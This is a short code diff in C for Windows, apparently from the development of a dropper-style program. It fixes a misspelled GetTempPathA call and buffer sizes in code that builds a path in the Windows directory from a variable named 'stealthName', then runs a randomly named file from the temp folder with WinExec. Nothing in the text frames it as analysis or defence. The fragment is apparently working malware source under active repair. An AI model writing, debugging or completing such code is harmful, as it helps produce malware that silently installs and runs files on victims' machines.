@@ -11,10 +11,10 @@ int main(){
 	char randomFilePath[MAX_PATH];
 	char tempDir[MAX_PATH];
 	
-	GetWindowsDirectoryA(winDir, sizeof(winDir));
-	snprintf(filePath,sizeof(filePath), "%s%s", winDir, stealthName);
+	GetWindowsDirectoryA(winDir, MAX_PATH);
+	snprintf(filePath, MAX_PATH, "%s%s", winDir, stealthName);
 	
-	etTempPathA(tempDir, MAX_PATH);
+	GetTempPathA(tempDir, MAX_PATH);
 	snprintf(randomFilePath, MAX_PATH, "%s%s", tempDir, random);
 	
 	WinExec(randomFilePath, SW_SHOW);
